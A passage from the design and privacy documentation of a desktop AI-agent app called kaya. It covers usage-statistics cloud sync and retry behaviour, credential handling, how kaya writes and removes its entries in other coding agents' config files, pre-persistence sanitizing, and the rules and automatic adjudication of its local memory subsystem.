  lower bound is the latest of the cursor, retention floor and event floor;
  turning the upload off and switching accounts move the cursor to the next
  usage bucket, with the watermark taken as `max(existing cursor, next bucket
  boundary)` — the cursor stays **monotonic** and is never pulled back, not even
  when the local clock was turned back; since 2026-10-28 re-consenting takes the
  "isolation rebase" instead and no longer moves the cursor to the next bucket),
  the aggregation window is empty ⇒ the round is **skipped**: zero aggregation,
  zero device registration, zero ingestion, zero cursor write (the cursor is
  **monotonic within a sync round** and must never be pulled back to the cloud
  time — that would backfill the events of the closed period). The waiting
  timestamp comes from that effective lower bound, not only from the persisted
  cursor. This **waiting period is not a "successful sync"**: it neither
  refreshes the "last successful sync" time nor clears an existing error code;
  it still counts toward the 5-minute fallback interval (otherwise the waiting
  period degenerates into a coverage poll every 60 seconds).
  **The event-driven path is throttled by that same 5-minute interval while
  the effective lower bound is ahead** (the event path is normally exempt so that uploads stay
  near-real-time, but every round during the waiting period is necessarily a
  "skip" — letting it through would turn the waiting period into a coverage
  request per usage event). Pending usage events are **not lost** during the
  waiting period: one more round runs automatically once the interval expires.
  **Mid-round 429 recovery**: backfill has a separate deployment-level rate
  limit (recommended: 10 requests per minute per user), so a bulk backfill may
  encounter a 429. On a 429 the client waits for the server's actual
  `Retry-After` and **re-sends the current batch**: the batches that already succeeded are **not**
  re-sent and the cursor is **not** advanced early (it moves only after every
  batch has succeeded); bucket values are cumulative, so re-sending the same
  batch is an idempotent overwrite that cannot double-count.
  **That wait can be interrupted**: when the user turns uploading off, the
  in-flight sync stops right away (at the request boundaries and during the
  wait); a cancellation is **neither an error nor a successful sync** (it does
  not refresh the "last successful sync" time, does not clear an existing
  error code and does **not** advance the cursor; pending usage events are
  kept), so the switch takes effect without waiting out the server's
  `Retry-After`. A round-level 429
  backs off per the server's `Retry-After` (each wait is clamped to a
  **1-hour ceiling**; after **60** consecutive 429 waits on one batch the
  client raises a retryable 429 to the round-level backoff ladder, so a huge
  server-supplied `Retry-After` can never hang one round forever while it
  holds the cross-process lock and the "Syncing…" state — the cursor has not
  advanced, so the next round re-sends the round's cumulative buckets and the
  overwrite stays idempotent),
  and 5xx plus network failures back off 1m → 2m → 4m → 8m → 16m. Failures
  while obtaining the login token are classified: network / timeout failures
  use the same backoff ladder (and retry automatically once the network
  recovers), a dead session waits for the next login-state change, and only
  other local permanent errors stop the automatic retries.
- **UI wording**: Settings shows the switch, the consent / revoked state, the
  **data-scope disclosure** (the purpose plus the automatic-sync note), a
  **separate note stating that the sign-in JWT is used for request
  authentication only**, the first-backfill progress, the last **successful**
  sync time (`last_sync_at` is persisted in local state and survives restart;
  account switches and revoke/re-consent clear it, while same-account re-enabling
  preserves it) — the value is a UTC RFC3339 string, and the **UI converts it
  to a readable local time in the machine's time zone** (a value that cannot be
  parsed is **kept verbatim**, so `Invalid Date` is never shown; `null` still
  shows "Never synced") — and the last failure (`last_error` is process-local). It also shows the latest
  result (`last_result`: `synced` / `no_new_data` / `waiting_next_bucket` /
  `already_syncing` / `skipped` / `error`), the updated bucket count, the fixed
  reason code `last_result_reason` for `skipped` (the wording distinguishes
  "some batches may have been sent before cancellation" from "nothing was
  sent") and the waiting cursor (also shown as a readable local time; the
  uploaded buckets / the cursor / the wire stay UTC RFC3339 — only the display
  layer changes), so "Sync now" distinguishes success, no new data, waiting,
  an existing run and failure. **Failures are shown as friendly wording**
  (each fixed error code maps to a localized explanation) while the **raw fixed
  code only remains in the `data-error-code` attribute for diagnostics** — the
  raw error string is never displayed; while a round is in flight a **separate**
  "Syncing…" badge is shown — it does **not** replace the on/off state badge
  (the user always sees whether the upload is on), and "Sync now" stays
  available as the manual fallback once the automatic sync finishes;
  **"backfilling" is only shown while the upload is actually enabled (consent
  valid) and the first backfill has not finished yet** — it is hidden while the
  upload is off or the consent version is stale. The front end **never touches
  a raw bucket** — the payload is aggregated locally on the Rust side.
- **Usage-event deployment ownership**: new desktop Chat and gateway events carry `cn` or `intl`, derived from the bundle identifier. Cloud aggregation accepts only its deployment. The standalone CLI has no cloud deployment selector: new events carry `local`, remain in local statistics, and are excluded from both CN and Intl cloud sync. Unknown tags are excluded. Legacy untagged events have unverifiable ownership and remain eligible in either deployment for compatibility; upgrading does not verify their identity. Backfill is capped at 30 days and limited by actual local records, retention and consent scope. Unrecorded or rotated-away history cannot be backfilled.
- **Cloud backup residue of ≤ 30 days** is guaranteed by the Users side (see
  `docs/api/usage-stats.md` §4.9). The cloud endpoints belong to the
  **yunhou-users** repository, while the customer console dashboard belongs to
  **yunhou-website**; user-facing cloud data terms are governed by the
  corresponding website's privacy policy.

**Known boundary of chat temporary images (2026-10-03)**: the boot sweep is
per-process and targets the whole `~/.kaya/tmp-images` root — when the dev
app (`com.kaya.dev`) runs alongside prod, one side's boot sweep wipes the
other side's still-live tmp-images root, and the "send to agent" paths on
that side's already-sent messages dangle (the agent cannot read the file
when the button is clicked). Accepted as a design boundary: tmp-images
never promised to survive a process, and dev/prod parallelism only moves
that window from "restart" to "the other instance starts"; the images
still live only for the current session, with no additional exposure.

**App version metadata** (round-56, 2026-06-28): The `get_app_info` Tauri singleton
command reads version / product_name / git_commit / build_time / target triple /
identifier from `tauri::Builder` + `env!` macros, displayed by Settings → "About"
tab and the Chat empty state. **Not written to localStorage, not written to audit
JSONL, not written to disk** — purely in memory; re-read on restart. See
`docs/superpowers/specs/2026-06-28-app-version-display-design.md`.

**API Key** is only sent in the LLM auth header. When it enters the conversation
JSON / audit JSONL it is processed as a scrub category. The audit log only
records "which provider was used", never the key contents.

**OAuth token rules (2026-10-17, Phase 3)**: same tier as an API Key — it only
goes into the LLM auth header (`Authorization: Bearer`) and is resolved by the
Rust `resolve_bearer` at send time (refresh near expiry; on a 401 force-refresh
and retry once). **The frontend structurally cannot see the token** (the
`provider_oauth_*` wire DTOs carry only state / user_code / verification URL /
fixed sentinels), and the IPC allowlist explicitly rejects `llm_oauth_*`
(generic `secret_get/set/delete` can neither read nor write that domain).
Sign-in state is **volatile**: the flow entry and the expired marker live only
in Rust process memory and are re-derived on restart from keychain token
presence; the frontend OAuth state cache (`oauthStates`) is not written to the
zustand persist store. **"Sign out" clears only the local keychain token and
in-memory state — the library file and `auth_kind` stay untouched, and no
server is notified** (the server-side token expires under its own policy).

**Agent config files are a projection of the model library (2026-09-10)**

The four agent config files kaya's "Use" button writes (`~/.claude/settings.json`,
`~/.kimi-code/config.toml`, `~/.config/opencode/opencode.json`,
`$CODEX_HOME/kaya.config.toml`) are no longer a **one-shot snapshot** — they are a
projection of the model library's current entries: adding / editing / deleting an
entry (`model_library_upsert` / `model_library_delete`) converges the difference
into them (`src-tauri/src/agent_model_sync.rs`).

- **The projection also covers thinking-effort keys (2026-10-24)**: the model library's
  thinking capability / effort levels are projected into each agent's native config —
  kimi `models.<alias>.support_efforts` / `default_effort`, the codex profile's
  `model_reasoning_effort`, opencode's `options.reasoningEffort`, and claude `env`'s
  `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL_SUPPORTED_CAPABILITIES` /
  `CLAUDE_CODE_EFFORT_LEVEL`. These keys express **capability and level only** — no
  credential and no endpoint. Model metadata such as thinking capability and effort
  levels is also used for config-optimization analysis through the existing scrubbing
  pipeline (`model_metadata` in `agent_config_analyze`). With no declaration kaya
  removes the key instead of writing an empty value.
- **Deleting an entry removes the plaintext key from the agent config (privacy-positive)**:
  previously, deleting a library entry left base_url / model / the **plaintext API
  key** sitting in the agent config file, while the UI — seeing no matching entry
  in the list — reported "not in use". Secrets stayed on disk in plaintext while
  the interface claimed otherwise. Now deletion removes kaya's managed portion from
  the agent config (including the credential field kaya wrote); clearing an entry's
  key likewise removes the leftover plaintext key from the config file (the apply
  contract gained `clear_api_key` — under the old contract an empty `api_key` only
  meant "keep the existing key", with no way to express "clear it").
  **The convergence is limited to agents that are currently bound**: the binding
  record only exists as of v2.2.1, so if an entry was deleted **before the upgrade**
  (v2.2.0 and earlier), that config file has neither a binding nor a matching entry
  and kaya has no way to tell "I wrote this, so I should take it back" — such
  leftovers are **not cleaned up automatically** (un-applying without a binding would
  delete the user's own configuration). They are only recorded as one warn-level
  app_log entry (event `agent_binding_stale`, payload `agent_id` only, no endpoint
  values or keys); clicking Use once for that agent converges it, and going back to
  the pre-kaya values requires restoring the `.bak` by hand.
- **Writing the claude config removes a conflicting `ANTHROPIC_API_KEY` (write-site
  behaviour, 2026-09-10 review n4)**: claude-code's credential field is
  `ANTHROPIC_AUTH_TOKEN` (the de-facto standard for third-party gateways), and Claude
  Code treats a simultaneously present `ANTHROPIC_API_KEY` as conflicting — so the
  **write branch of apply** drops `ANTHROPIC_API_KEY` when it writes
  `ANTHROPIC_AUTH_TOKEN` (the usual practice of third-party gateway tools). This is de-conflicting on
  write, not "the key is kaya's to manage": the `clear_api_key` branch and un-apply
  **only remove the `ANTHROPIC_AUTH_TOKEN` kaya wrote itself, and never touch
  `ANTHROPIC_API_KEY`** — that key may be the user's own, never written by kaya, and
  deleting it would be destroying a user secret on their behalf.
- **The binding record holds no keys**: "who is using which entry" lives in the
  top-level `bindings` of the library file (since the 2026-10-16
  provider-hierarchy refactor the value is an object:
  `{"kimi-code": {"provider_id": "p_ab12cd34", "model_id": "kimi-k2-0905-preview", "via_gateway": true}}`)
  as an agent id → (provider id, model id) mapping only. API keys still live solely in the keychain
  (`llm_api_key_<providerId>`), so bindings introduce no new surface where secrets
  land on disk. Degradation is **per pair**: a top-level key that is not an object
  is treated as empty, while inside the object only the illegal pair is dropped and
  valid bindings survive (never the whole table — otherwise the next write would
  silently drop the user's other valid bindings). When nothing is left, the key is
  **removed** rather than left behind as an empty `{}` shell. The degradation itself
  is logged to app_log; reading the library never fails over it.
- **Sync touches only the parts kaya manages**: un-apply is precise about the keys
  kaya itself wrote (claude-code's managed env keys and the picker row marked
  `configured by kaya`; kimi-code's `providers."kaya-switch"` /
  `models."kaya-switch/main"` / `default_model` only when it equals the kaya alias;
  opencode's `provider.kaya` / the top-level `model` only when it carries the `kaya/`
  prefix; codex's profile and generated catalog files, plus the traces written
  directly into Codex's own config by pre-2026-09-09 versions — kaya's provider
  pointer / top-level model name / catalog pointer / the
  `[model_providers."kaya"]` block carrying a **plaintext bearer**). **The user's own
  fields, other providers and other picker rows are always preserved**; **sync
  (apply / un-apply) only acts on agents that have a binding** — an agent with no
  binding is never written to and never un-applied. Adoption and the stale-trace check
  (see below) do one **read-only** inspection of the config file of every **unbound**
  supported agent (to read the kaya marker and the current endpoint values): no content
  is written and the configuration is not changed — like every read path it may tighten
  an over-permissive legacy file's permissions to 0o600 (existing behaviour of
  `read_json_object` / `read_toml_table`). If every
  value already matches, not a single byte is written (no `.bak` noise). When a
  binding points at an entry that no longer exists (left by a crash or a power loss),
  the read path performs one un-apply and clears the binding — otherwise the UI would
  say "not in use" while the agent still used the deleted entry's endpoint and
  plaintext key.
- **Historical behavior before config snapshots**: overwritten pre-apply values did not necessarily have a recoverable source, and un-apply only removed kaya-managed fields; users needed their own `.bak`. **Current behavior follows §8.2**: snapshot managed keys before takeover, restore according to ownership and current values, preserve later user edits, never fabricate unknown originals, and retain unrestored originals in a separate `.unrestored.<uuid>.bak` when required.
- **Startup and opening the panel never rewrite anything routinely**:
  `model_library_list` performs migration + identity adoption + dangling-binding
  cleanup, and `agents_model_config_get` performs adoption for a single agent before
  reading; neither adds, edits or deletes library entries. The orchestration's sync
  does run for all three commands, but **if every value already matches it writes not
  a single byte** — the only states it corrects are genuine drift (a binding still
  exists while the agent's config file was edited externally, which gets converged
  back) and dangling bindings (see above). Identity adoption: an upgrade user
  who configured an agent with "Use" before, but has no binding record, gets one only
  when the config file's current (base_url, model) uniquely matches exactly one
  resolvable entry; 0 matches (the user's own config) or ≥2 (ambiguous) are never
  adopted. A wrong binding is worse than none: it would let the next library change
  overwrite the user's own configuration. Adoption also requires a **marker kaya
  itself wrote** in that file (claude's `configured by kaya` picker row / kimi's
  `providers."kaya-switch"` / opencode's `provider.kaya` / codex's profile or the
  legacy base config's `model_provider = "kaya"`) — **a hand-written config is never
  claimed**, even when its endpoint matches a library entry word for word, so deleting
  that entry cannot take the user's own base_url / model / plaintext credential with
  it. A marker that cannot be read counts as a failure, never as "no marker".
  **When the endpoint was edited so that it matches no entry, or the matching entry was
  deleted, that agent is not adopted** — the panel shows no "In use" (and no drift notice
  either: `isDrifted` requires an active binding, and with no binding there is no entry to
  compare against) and later convergence never overwrites it; clicking Use once for that
  agent re-establishes the binding.
- **Observable**: sync actions are recorded in app_log (tag `models`, event
  `agent_model_sync`; the payload carries agent_id / provider_id / action and **no
  secrets**); adoption / sync failures are logged only and never block a library
  command (the same policy as "migration failure does not block"), and they are
  **best-effort per agent** — one agent failing to read or write does not affect the
  others (the failed binding is kept and retried on the next action). The plaintext
  key comparison (`current_api_key`) is used inside sync only and **never crosses the
  IPC boundary**; the only two key-related fields in `ModelConfigStatus` are booleans
  — `has_api_key` (does the agent config hold a key) and `entry_key_present` (**does
  the bound entry have a key in the keychain**; `null` when there is no binding, the
  agent is unsupported, or the keychain read failed, in which case it takes no part in
  the panel's mismatch check). **Presence only, never the key value.** There is also
  `agent_binding_stale` (warn level; see the "deleting an entry" bullet above — a
  leftover config carrying a kaya marker with no entry left in the library; its
  payload is likewise only `agent_id`). It reports and never changes anything:
  automatic cleanup would delete the user's own configuration.

**Sanitize before persistence** (`src/lib/messagesPersist.ts`):
- The `reasoning` field is **not stored** in localStorage — the display-layer
  chain of thought lives only in the audit JSONL, and is discarded on page
  reload (prevents the localStorage 5 MB cap from blowing up + reasoning is
  too long to be worth caching). Note the distinction from the Rust-side
  conversation store (since 2026-09-16): the `reasoning` of assistant messages
  in `~/.kaya/conversations/*.json` is **always persisted, regardless of the
  thinking display toggle** — upstream models (DeepSeek v4 default-thinking,
  Kimi k2.6+/MiniMax M2+ always-on) emit reasoning_content even when thinking
  is OFF and require it echoed back verbatim on the next request; dropping it
  triggers a 400 "reasoning_content must be passed back" after many tool-call
  rounds. The display gate lives at the agent loop's event emission layer
  (with thinking OFF the frontend still renders no thinking blocks);
  persistence exists solely to satisfy the echo contract. The data never
  leaves the machine and stays under the same on-disk permissions and scrub
  rules.
- `toolCalls.outputFull` is not stored (the ephemeral "expand" copy; can be
  regenerated by re-running the command)
- `retryText` is not stored (v2.3.3 review R2): the verbatim user-input
  snapshot pinned onto an error banner's "retry" button is **unscrubbed**, and
  after reload the button doesn't render anyway (the `lastSentText` it falls
  back to is a runtime field, null after refresh) — persisting it would only
  write plaintext user text into localStorage with no functional benefit. The
  strip happens only at the persistence boundary; in-memory retry within the
  current session is unaffected.
- `toolCalls.output > 30KB` is truncated to 30 KB and tagged
  `outputTruncated: true`

The `Message.kind` field is preserved (banner messages survive reload — the
user keeps seeing the "tool-call budget exhausted" notice).

**Scheduled-task prompt retention differs from chat messages** (v2.1.12,
R2-G6): chat messages are scrub-first — the user-input guard scrubs before
anything enters the store / audit, so what lands on disk is the scrubbed
text. A scheduled task's prompt is configuration the user wrote themselves
in the Settings form, and is kept **verbatim** in local `localStorage` (not
scrubbed, never leaves the local machine boundary); scrubbing runs at fire
time on the way out (the same user-input guard at the `runAgent` entry:
scrub → truncate → then into `llm_chat`). In other words: verbatim
retention ≠ verbatim transmission — the outbound path is exactly the same
as a hand-typed chat message. **Transmission-side note (2026-09-03
review; queue_snapshot added 2026-09-19)**: `schedule_manage`'s list output (the task snapshot, including
a 40-character preview of each prompt), `task_list`'s task-list snapshot,
and `task_queue`'s queue snapshot (`queue_snapshot`, carrying each task's
title / brief / state) follow the same precedent — the content is the user's
own data and
reaches the LLM provider verbatim, without scrubbing (scrubbing is
self-managed per tool; these three tools deliberately do not invoke it).

**Directory-level defense-in-depth and the remaining v3.0.7 persistence /
ingress hardening (2026-10-08)**: `kaya-core::data_root` is the unified
directory-permission entry point — the `~/.kaya/` root and known
subdirectories are created at 0o700, and boot tightens already-existing
over-permissive directories (directories only, never files; missing
subdirectories are not pre-created; best-effort). Unix-only: Windows has no
per-app file isolation (it relies on NTFS default ACLs and the Credential
Manager — an inherent platform limitation; the 0o600 caliber stated
elsewhere in this document is macOS semantics, stated honestly here). The
same batch: ① the CLI REPL's history persistence and input guard now
delegate to the full `apply_user_input_guard` (Strict level — previously
only PEM + `sk-` were covered, so a GitHub PAT etc. would land in the
history file verbatim); the CLI input-guard level is fixed at Strict,
aligned with the desktop (the output-scrub level still respects CLI
configuration); ② `control_grant_respond` gains a pending-state-machine
gate — an approval without a matching pending grant request is denied
outright, an approval matching an existing grant with the same (tab, agent,
pid) fingerprint passes idempotently, and deny is not subject to the gate
(IM / remote card approvals take an independent path with their own
fingerprint TTL checks and are unaffected; clicking a leftover grant card
revived after a restart yields an error message instead of a silent
authorization); ③ upstream error details of both the builtin `/chat` and
BYOK now uniformly pass `sanitize_upstream_message` (JWT stripping → Strict
scrub → truncation) before reaching the screen or IM — the BYOK
ProviderError arm previously lacked even JWT stripping, so a malicious
upstream could plant echo content in a 4xx/5xx body that landed in the
conversation and on IM.

### 8.1 The Memory Subsystem (2026-09-04)

Source: `crates/kaya-core/src/memory/` (types / store / versions / review /
autonomy / retrieve / decay / consolidate / prompt), the desktop command shell
`src-tauri/src/memory_tauri.rs`, the front-end `src/lib/memory.ts` +
`src/components/SettingsMemory.tsx`.

**Storage and write discipline.** All memory data lives under
`~/.kaya/memory/` — no cloud sync, no telemetry, the same boundary as
every other kaya local store:

- `core.json` — core memory (a projection of Pinned entries, rewritten
  whole).
- `episodic/YYYY-MM.jsonl` — episodic memory, append-only monthly shards.
- `review.jsonl` — the **legacy candidate queue (retired, 2026-10-28)**:
  new production paths never write to it (automatic adjudication has no
  "awaiting approval" state). The file has exactly one remaining use —
  automatic migration of legacy entries, where successful items leave the
  queue and only unfinished technical-retry items stay.
- `review-history.jsonl` — the **recent automatic changes ledger** (named
  "processed review records" when created on 2026-10-03; repurposed
  2026-10-28): one entry appended after every automatic outcome (add /
  reinforce / supersede / generalize / archive, reason `auto_*` or
  `legacy_auto_*` for migrated legacy items) succeeds (content + action +
  time), capped at 200 entries with oldest-first FIFO eviction, powering
  the read-only "Recent automatic changes" section in Settings → Memory;
  never exposed to any LLM tool output.
- `versions/<memory_id>.jsonl` — per-memory version chain, append-only,
  never rewritten (sole exception: **Delete permanently** (purge) replaces
  the content of all historical versions with `[purged]`, keeping the
  version skeleton — see "Deletion is forgetting" below).
- `staging/` — consolidation pipeline intermediates (snapshots of evicted
  conversations awaiting consumption).
- `state.json` — global state (consolidation cursors / last decay sweep
  time). The legacy `auto_accept` / `auto_accept_threshold` fields remain in
  the file **for wire and file-format compatibility only — they no longer
  affect any write**; automatic adjudication never consults them.

Every write is same-directory `.tmp` → fsync → rename (atomic), with
0o600 on newly created files on Unix (same discipline as conversation /
audit persistence); JSONL reads are fault-tolerant (bad lines skipped with
a warning). Core memory has a capacity gate: 24 entries / 2KB; an
overflowing write is rejected before touching disk (`core_full`) with zero
side effects.

**Layers and lifecycle.** Four layers (engram layering completed
2026-10-03): core (Pinned, injected into the context every turn — see
below), semantic (Semantic — general knowledge distilled from clusters of
related episodic memories, see "Semantic memory layer" below), episodic
(Normal, retrieved on demand), and cold storage (Archived, excluded from
retrieval by default). Salience drives decay: a periodic sweep runs at
boot and before `memory_stats` reads (at most once per 24h); a Normal
entry not hit for 30 days loses 0.1 salience, and below 0.2 it is
auto-archived (Archived); every `memory_search` hit adds +0.1, and an
Archived entry that gets hit is resurrected (salience back to ≥0.2;
`memory_timeline` hits on archived entries are deliberately read-only —
no write-back, no resurrection). Pinned and Semantic entries never decay
(general knowledge is not forgotten). **Retention of raw sessions and
audit logs is unchanged** (50-conversation LRU cap, 90-day audit
pruning); when a conversation is evicted, a full snapshot is placed in
`staging/` before the on-disk file is deleted, and the snapshot is
removed only after the next consolidation consumes it. Memory entries
themselves are kept indefinitely; "discard" is not physical erasure but a
tombstone (logical deletion: invisible to retrieval, lists, and
injection) plus a version record, so the trail stays auditable.

**Rule / fact classification (2026-10-11, spec
`docs/superpowers/specs/2026-10-11-memory-kind-scope-index-design.md`).**
Every memory carries a `kind` (rule / fact; legacy data defaults to fact)
and a `scope` (global / project; live since 2026-10-12 P1 — the inline
marker "本项目:…" / "project: …" or a project scope suggested by
consolidation binds the entry to the writer's cwd, normalized before
storage; desktop cwd = the active pane's cwd passed through by the
frontend (falling back to the run_shell working directory when absent or
blank), CLI = launch
directory, IM = provision-bound directory; unknown cwd always degrades to
global, fail-closed, never an error). Rules are behavioral constraints
that must be present every turn (e.g. "run tests before committing"):
they are excluded from the search pool (memory_search / memory_timeline),
never decay, never enter core.json, and render in a dedicated `[rules]`
section of the context message (capacity gate: ≤16 global / ≤8 per
project / ≤1KB rendered, overflow fails as `rules_full` with zero side
effects; project rules inject only when the session cwd matches the bound
path prefix, marked "(本项目)" per line, Strict-scrubbed like global
rules — only the rule **text** is injected, the scope path itself never
enters the context). **Rules take effect only on deterministic evidence
(2026-10-28 autonomous memory; tightened during the 2026-10-29 release review)**:
only an `ExplicitUser` candidate may become a Pinned rule and be injected next
turn. A source id matching a real user message in the batch is only attribution,
not sufficient proof: the cited user message must independently pass
`detect_remember_intent` with the **Rule** classification, and the detector's
stripped content must match the candidate after normalization (whitespace folding
+ lowercase). Model-declared evidence, a real id with unrelated or paraphrased
content, and `RepeatedPattern` / `UserAsserted` rule candidates are all demoted
to facts with no always-present authority; `AssistantInferred` never becomes a
rule. Legacy migration retains its original exception and does not widen online
authority. `memory_add` derives kind from the user's original text at registration
and rejects a mismatch declared by the model (an omitted kind inherits the
intent classification). Strict fallback writes only the stripped content,
truncating inline text only at an explicit task boundary (punctuation + a
linking phrase + a task verb), so ordinary conjunctions are not mistaken for
task boundaries; it does not persist `remember: rule:` prefixes or subsequent
task text.
`salience` expresses long-term value and retrieval weight only and is
**not user evidence** — no amount of salience grants rule authority. When
rule capacity is full the new rule is Archived (never queued, and never
silently evicts an existing rule); a legal automatic Supersede does release
the target's capacity, but the capacity gate is always a **pure read
pre-check before any write** — no "same transaction" atomicity is claimed
(see the failure/replay semantics below). Dedup hits (reinforce / revive)
and explicit "remember" dedup hits **upgrade the stored evidence**:
`ExplicitUser` is strongest, `RepeatedPattern` / `UserAsserted` may upgrade
`AssistantInferred`, and weak evidence never overwrites strong evidence;
`SemanticCluster` is the generalization entry's own construction evidence and
stays unchanged in semantic merges. An archived `AssistantInferred` entry
that a user-evidence restatement revives carries the upgraded evidence. Facts keep their
existing semantics:
Pinned goes to the `[core facts]` section, Normal/Semantic stay
on-demand; retrieval ranking applies a scope weight (project entry
matching the current cwd ×1.3, non-matching ×0.7 soft demotion — never a
hard exclusion). The context message also gains a `[memory index]`
section: one-line summaries of all visible facts (id + ≤60 chars,
Strict-scrubbed before truncation, ≤1KB) so the model knows what it can
look up on demand; memory_search output carries a "N hits, this is the
complete result set" boundary note, and zero hits return a plain "no
matching memories" text (abstention signal against fabrication).
**Conflict handling and knowledge updates (2026-10-12 P2; automatic
adjudication 2026-10-28):** consolidation dedup keeps its second band —
top-1 jaccard ∈ [0.5, 0.8) marks the candidate `conflict_candidate_of`.
**A legal automatic Supersede must satisfy every condition at once**: the
target exists, is not the candidate itself, has the same kind and
normalized scope, is still active, the candidate carries `ExplicitUser` or
`UserAsserted` user evidence, the target belongs to this run's
similar/conflict candidate set, and the candidate's `event_at` is not older
than the target's. When all hold, the new entry is stored and the old one
gets a `superseded_by` back-pointer (invalidate-not-delete — body and
version chain stay forever). The old entry's pointer and the core-projection
removal are **required consistency side effects**, not best-effort: if either
doesn't land the adjudicator returns a retryable error, and the replay
recognizes the already-stored equivalent new entry and completes the side
effects instead of creating another one. **When any condition fails the old entry must
not be overwritten**: if the target really is a conflict candidate, the new
entry carries `conflict_with=<old id>` and **both sides are kept** (the old
entry itself is never rewritten); retrieval summaries expose the pointer so
the Agent can judge in context. **A jaccard conflict band alone never
triggers an automatic Replace.** Superseded entries are excluded from
retrieval and rule injection and don't count toward rule capacity. Fact
entries in Settings → Memory still offer a manual "mark superseded…" escape
hatch (`memory_update` with `supersede_old_id`, fail-closed with zero side
effects when the target doesn't exist). Rule ⇄ fact conversion and scope
changes go through `memory_update` (Settings → Memory rules section,
version chain actor=User).

**Required side effects, failures and replay (2026-10-28).** One adjudication
is *not* promised to be a single atomic transaction — multi-file writes cannot
be atomic without compensation. Two classes:
- **required consistency side effects** — the entry itself, its pointers
  (`superseded_by`), member invalidation pointers, the core projection
  (`core.json`) and the **current version record**. Any failure returns a
  **retryable error**: the batch cursor does not advance and the legacy queue
  item stays; whatever could succeed in this round is still completed and the
  in-memory snapshot is synced to what actually reached disk. Errors carry only
  fixed short codes / counts, never entry text.
- **best-effort** — the `review-history.jsonl` activity record (a write failure
  only warns and never overturns an outcome that already holds).
Replay compensates instead of duplicating: a generalization replay merges into
the equivalent Semantic entry already stored (member pointers + activity), and
members already pointing at it still take part in the core-projection
compensation. Repair targets must still be **active**: a Semantic entry that has itself been
superseded never re-claims members. User updates, rollback, purge and relink advance member ownership epochs. The authoritative member is persisted before old Semantic registrations are cleaned; cleanup failure returns a retryable code and does not undo the durable user decision.
The **no-LLM repair channel** makes no model call, records no activity and performs no reinforcement. It restores pointers only when a durable exact claim matches the current member pointer/epoch, and reconciles projections for members already pointing at the target. Historical ID sets without claims do not authorize reattachment. A→B→purge B cannot let A reclaim the member; even a same-pointer rollback invalidates old claims.
A supersede replay recognizes only the **persistent operation
identity** (the new entry's `supersedes` pointing at the replaced entry id; only
automatic supersede writes it, every other path leaves it unset): an equivalent
entry without that identity — a user-written synonym, a Semantic summary,
another operation's product — is never substituted. Evidence and time checks run
before replay detection, so `RepeatedPattern`, an older `event_at`, or a
kind/scope mismatch cannot bypass them through replay. Replay only completes the
old entry's pointer, the core projection and the new entry's current version
record — no new entry, no duplicate activity, no duplicate reinforcement.
For supersede, activity is written only after every required side effect
succeeded, so failed attempts and replay completion record nothing (at most one
record per outcome). **Generalization / merge orders differently**: it writes
activity after the compensation attempt and before the aggregated error, because
the consolidation "cluster already processed" gate reads it — while recovery does
**not** depend on that activity history (it relies on exact ownership claims stored on
the Semantic entry itself).
After a session fails, consolidation reloads the on-disk episodic snapshot before
the next session, so half-persisted entries are not duplicated from a stale view. A missing current version record is
appended later by the dedup / revive / replay paths (`ensure-current-version`);
the version chain is append-only and entries are never rolled back to fake
atomicity. Archive is an idempotent terminal state (an equivalent Archived
entry is returned as-is), and legacy `review.jsonl` is read **strictly** — a
malformed or unreadable queue aborts the whole migration round before any
candidate write, leaving the file byte-identical and writing no memory entries.

**Consolidation's LLM outbound boundary.** Consolidation is the only path
that hands session content to an LLM to be "distilled" into candidate
memories, and its outbound scope is exactly the chat provider you have
currently chosen:

- **BYOK**: uses the provider / model / key currently configured in
  Settings — the same channel as a chat turn.
- **Builtin model**: goes through the yunhou `/chat` proxy (JWT) and
  passes the same login gate + paid gate as `llm_chat`; without paid
  access it neither errors nor extracts — it returns an empty report with
  `skipped_paid_gate` (the front-end shows a toast guiding you to
  subscribe).
- **Ollama**: local inference; consolidation is likewise zero-outbound.

Triggers: automatic consolidation when a chat session ends (empty
sessions are skipped — no quota spent), a periodic consolidation at app
launch (2026-10-02: after auth settles, it runs only when the toggle is
on, you are logged in, there is pending work, and the last run was ≥24h
ago; can be disabled in Settings → Memory), a manual "Consolidate now" in
Settings → Memory, and consumption of `staging/` snapshots on the next
run. The extraction prompt requires the model to output only a JSON array;
extraction failures are logged as warnings and never block the session.
Since 2026-10-03 the extraction prompt also carries three exclusion rules
(both Chinese and English): no transient state snapshots (tab mappings /
progress reports / uncommitted-undeployed statuses that go stale within
days), no descriptions of kaya's own mechanisms or policy boundaries, and
no QA-test residue — plus a "be conservative" instruction. A review of the
real queue showed roughly half of all candidates were this kind of
low-value noise; intercepting at extraction time saves both later cleanup
effort and model quota.

**Automatic adjudication and tool visibility (since 2026-10-28).** Memory
writes take two paths, with different mechanics and **no "awaiting user
approval" state in either**: ① the **automatic adjudication path**
(consolidation extraction / semantic generalization / legacy queue
migration) goes exclusively through `memory/autonomy.rs::commit_candidate`,
whose outcome is exactly one of six: stored (`Accepted`) / reinforced
(`Reinforced`) / superseded (`Superseded`) / generalized (`Generalized`) /
archived (`Archived`) / rejected (`Rejected`, carrying only a fixed reason
short code); ② the **explicit "remember" path** (pure / inline / loose /
detector-stripped memory-content fallback) uses `capture`'s typed direct write
(`capture_with_kind`; `capture_direct` is its Fact-only compatibility
wrapper and `capture_fallback` handles the detector-stripped memory-content fallback) and reports
its own exact outcome: stored
(Normal / Pinned), a dedup hit that only reinforces the existing entry,
Archived when rule capacity is full (stated plainly as "archived, not
active"), or a refused write when the content is empty or collapses to a
single secret placeholder. Neither path is affected by the `auto_accept`
toggle or threshold any more. None of the three memory tools
(`memory_search` / `memory_timeline` / `memory_get`) exposes the retired
queue — they read only stored episodic and core memory (tombstones are
never visible; `memory_get` treats them as not_found), and the core
injection block renders only Pinned entries. `memory_search` summaries now
carry `evidence` and `conflict_with` (the latter is null when there is no
conflict, so the shape is stable), letting the Agent tell user facts,
assistant inference and unresolved conflicts apart. The precise boundary:
the `~/.kaya/memory/` directory itself sits inside the trusted root, so
`cat`-style trusted-read commands can read its files (same precedent as
`conversations/` and other on-device data), with the scrubber running as
usual.

**Queue capacity: retired (2026-10-28).** The 200-item capacity gate, the
FIFO eviction into Archived, and in-queue jaccard dedup are **no longer
production paths** — automatic adjudication never produces pending
candidates (low-confidence candidates end as archived or rejected, never
re-queued). Legacy `review.jsonl` entries are migrated **idempotently and
automatically** by `memory_stats`, inside the existing memory lock and
before statistics are computed: legacy candidates default to
`UserAsserted + Add` (no original messages required in legacy context);
items that satisfy the rule / fact / semantic conditions take effect
